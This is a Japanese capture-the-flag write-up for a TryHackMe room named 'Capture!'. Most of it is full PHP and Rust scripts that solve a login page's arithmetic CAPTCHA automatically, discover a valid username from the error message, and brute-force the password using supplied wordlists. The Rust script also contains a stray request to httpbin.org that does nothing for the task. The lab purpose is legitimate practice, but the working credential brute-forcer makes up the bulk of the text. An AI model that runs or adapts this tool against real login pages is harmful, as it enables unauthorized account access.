### :ramen: Capture!
https://tryhackme.com/room/capture

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/94946a2e-17b6-409d-a6e6-6fd9e2a1a2bb)

🤔　usernames.txt passwords.txt が与えられるので、これでID見つけるだけだと思った。Hydraまわしてダメ。


![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/9304cb7d-fa63-48f7-8207-733af099865b)

🤔　リキャプチャがあった。簡単な計算問題のよう。レスポンスから計算してリクエストに設定できればよさそう。

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/22ffffaf-6fcb-4096-bb1c-aaaa1e3ca364)

🤔 Error: The user 'test' does not exist とありヒントにErrorの内容を読むようにかいてある。
とりまPHPでつくる。ほとんどちゃっとさんからコピペしたのに半日かかってしまった。つらい。。。

```
<?php
    echo "------ START -----\n";
    $time_start = microtime(true); //実行開始時間を記録する
    
    // USERNAME.txt PASSWORD,txt 読み込み
    $USERNAME = array();
    $line = file('usernames.txt'); 
    foreach ($line as $line) {
        $line = str_replace(" ", "", $line);
        $line = str_replace("\r", "", $line);
        $line = str_replace("\n", "", $line);
        $USERNAME[] = $line;
    }
    $PASSWORD = array();
    $line = file('passwords.txt'); 
    foreach ($line as $line) {
        $line = str_replace(" ", "", $line);
        $line = str_replace("\r", "", $line);
        $line = str_replace("\n", "", $line);
        $PASSWORD[] = $line;
    }

    // CURL
    function my_curl($username,$password,$captcha){
        $CURLERR = NULL;

        $data = array(
            'username' => $username,
            'password' => $password,
            'captcha'  => $captcha,
        );

        $URL = 'http://10.10.110.220/login';                                // YOUR TARGET IP
        $ch = curl_init($URL);

        curl_setopt($ch, CURLOPT_POST, TRUE);                               //POST
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));      //データをセット
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);                     //受け取ったデータを変数に格納
        $response = curl_exec($ch);

        if(curl_errno($ch)){        //curlでエラー発生
            $CURLERR .= 'curl_errno：' . curl_errno($ch) . "\n";
            $CURLERR .= 'curl_error：' . curl_error($ch) . "\n";
            $CURLERR .= '** curl_getinfo **' . "\n";
            foreach(curl_getinfo($ch) as $key => $val){
                $CURLERR .= '++' . $key . '：' . $val . "\n";
            }
            echo nl2br($CURLERR);
        }
        curl_close($ch);
        //echo $response;
        return $response;
    }

    
    // レスポンスからcaptchaの計算結果返却
    function calc_captcha($res){
        // レスポンス指定なしの場合レスポンスを取得して分割
        if(empty($res)) {
            $line = explode("\n", my_curl("dummy","dummy",""));
        }else{
            $line = explode("\n", $res);
        }

        // ?を含む行を取得
        foreach ($line as $line) {
            //echo $line;
            if (strpos($line,'?')) {
                // 数字取り出し
                $numbersArray = preg_split('/[^0-9]+/', $line, -1, PREG_SPLIT_NO_EMPTY);
                // 演算子取り出し（数字１　演算子　数字２　の順で計算）
                if (strpos($line,'+')){
                    $result = ($numbersArray[0] + $numbersArray[1]);
                }else if(strpos($line,'-')){
                    $result = $numbersArray[0] - $numbersArray[1];
                }else if(strpos($line,'*')){
                    $result = $numbersArray[0] * $numbersArray[1];
                }else if(strpos($line,'/')){
                    $result = $numbersArray[0] / $numbersArray[1];
                }else{
                    echo "ERROR NO MARKS";
                }
                //echo $result;
                return $result;
            }
        }
    }

    // ユーザ特定
    $response = null;
    for ($i = 0; $i < count($USERNAME); $i++) {
        $captcha = calc_captcha($response);
        $response = my_curl($USERNAME[$i],"password",$captcha);
        //echo $response;
        if (strpos($response,'Invalid captcha')) {
            echo "Invalid captcha \n";
            exit;
        }
         if (strpos($response,'does not exist')) {
             //echo ":( [INVALID] CNT:$i USER:$USERNAME[$i]\n";
         }else{
             $user = $USERNAME[$i];
             echo ":) [!!BINGO!!] CNT:$i USER:$user\n";
             break;
         }
    }
    
    // パスワード特定
    $response = null;
    for ($i = 0; $i < count($PASSWORD); $i++) {
        $captcha = calc_captcha($response);
        $response = my_curl($user,$PASSWORD[$i],$captcha);
        //echo $response;
        if (strpos($response,'Invalid captcha')) {
            echo "Invalid captcha \n";
            exit;
        }
         if (strpos($response,'Invalid password')) {
             //echo ":( [INVALID] CNT:$i PASS:$PASSWORD[$i]\n";
         }else{
             $pass = $PASSWORD[$i];
             echo ":) [!!BINGO!!] CNT:$i PASS:$pass\n";
             break;
         }
    }
    
    $time_end = microtime(true);
    $time = $time_end - $time_start;

    echo ":D USER:$user PASS:$pass TIME:$time \n";
    echo "Happy Hacking ! \n ";
    echo "----- END -----";
?>
```

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/1f53235e-d9a5-4947-b786-11690b05dd11)

🤓 今日人類が一番頑張ったところはここ！

全部リストまわりきって、みつからんぞ（バグか？ﾌﾟﾝｽｶ）となり、WriteUpにあったPythonをまわしたところ、見つかった。
自バグだった。えー、一行読み込みの時の改行のCRLF。昔もあったきがするし、よくあるバグです。（疑ってすいません。）

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/a01fd789-b752-4d53-bc77-41b5fcb056cb)

🤓 私の環境では471秒かかった。途中経過が気になる方はデバッグ用のechoだしてみて。余計時間かかりますが。。。
複数スレッドで同時にPOSTするとリキャプチャがずれてダメ。1スレで気長にやるしかない。


### :ramen::ramen: Okawari
高速化を図るべくRust。（ほぼちゃっとさん）

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/4185513e-7ac5-4803-9ebb-cd399cfbd364)

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/b2929bee-7bc3-4427-83eb-eb69d5878bb5)

```
use std::fs::File;
use std::io::{self, BufRead};
use std::fs;
use std::time::{Instant, Duration};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("------ START RUST-----");
    // 計測を開始
    let start_time = Instant::now();

    // ファイルを読み込むヘルパー関数
    fn read_lines(filename: &str) -> Result<Vec<String>, io::Error> {
        let file = File::open(filename)?;
        let lines = io::BufReader::new(file).lines();
        let mut result = Vec::new();

        for line in lines {
            result.push(line?);
        }

        Ok(result)
    }
    // USERNAME.txt PASSWORD.txt 読み込み
    let usernames: Vec<String> = read_lines("usernames.txt")?;
    let passwords: Vec<String> = read_lines("passwords.txt")?;

    // CURL関数
    fn my_curl(username: &str, password: &str, captcha: &str) -> Result<String, reqwest::Error> {
        let url = "http://10.10.110.220/login"; // YOUR TARGET IP
        let client = reqwest::blocking::Client::new();
        let res = client.post("http://httpbin.org/post").body("the exact body that is sent").send()?;
        let mut data = std::collections::HashMap::new();
        data.insert("username", username);
        data.insert("password", password);
        data.insert("captcha", captcha);

        let response = client.post(url).form(&data).send()?;
        let body = response.text()?;
        //println!("BODY{}",body);
        Ok(body)
    }

    // レスポンスからcaptchaの計算結果返却
    fn calc_captcha(res: &str) -> i32 {
        let lines: Vec<&str> = res.lines().collect();

        for line in lines.iter() {
            if line.contains('?') {
                let numbers: Vec<i32> = line
                    .split(|c: char| !c.is_digit(10))
                    .filter_map(|s| s.parse().ok())
                    .collect();

                if line.contains('+') {
                    return numbers[0] + numbers[1];
                } else if line.contains('-') {
                    return numbers[0] - numbers[1];
                } else if line.contains('*') {
                    return numbers[0] * numbers[1];
                } else if line.contains('/') {
                    return numbers[0] / numbers[1];
                } else {
                    println!("ERROR NO MARKS");
                }
            }
        }
        0 // デフォルトの値を返す（エラーの場合）
    }

    // ユーザ特定
    let mut user = String::new();
    let mut response = String::new();
    for (i, username) in usernames.iter().enumerate() {
        if(i==0){
            response = my_curl("dummy", "password", "1")?;
        }
        let captcha = calc_captcha(&response);
        response = my_curl(username, "password", &captcha.to_string())?;
        if response.contains("Invalid captcha") {
            println!("Invalid captcha");
            //std::process::exit(1);
        }
        if response.contains("does not exist") {
            //println!(":( [INVALID] CNT:{} USER:{}", i, username);
        } else {
            user = username.clone();
            println!(":) [!!BINGO!!] CNT:{} USER:{}", i, user);
            break;
        }
    }

    // パスワード特定
    let mut pass = String::new();
    response.clear();
    for (i, password) in passwords.iter().enumerate() {
        if(i==0){
            response = my_curl("dummy", "password", "1")?;
        }
        let captcha = calc_captcha(&response);
        response = my_curl(&user, password, &captcha.to_string())?;
        if response.contains("Invalid captcha") {
            println!("Invalid captcha");
            std::process::exit(1);
        }
        if response.contains("Invalid password") {
            //println!(":( [INVALID] CNT:{} PASS:{}", i, password);
        } else {
            pass = password.clone();
            println!(":) [!!BINGO!!] CNT:{} PASS:{}", i, pass);
            break;
        }
    }

    // 計測を終了
    let end_time = Instant::now();
    // 経過時間を計算
    let elapsed_time = end_time.duration_since(start_time);

    println!(":D USER:{} PASS:{} TIME:{:?}", user, pass, elapsed_time);
    println!("Happy Hacking !");
    println!("----- END -----");

    Ok(())
}
```

Cargo.toml
```
[package]
name = "my_project"
version = "0.1.0"
edition = "2018"

[dependencies]
tokio = { version = "1", features = ["full"] }
reqwest = { version = "0.11", features = ["blocking", "json"] }

[[bin]]
name = "capture"
path = "./main.rs"
```

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/e47ae156-fec1-4c76-b5c6-9a39d9292242)

891秒。。。またつまらぬものを切ってしまった。。。

※cargo build --release でやった。（オプション設定のチューニングが足りないのか？にわかなためわからん。）

🍜 Thank you for your time! Happy Hacking! 🍜 
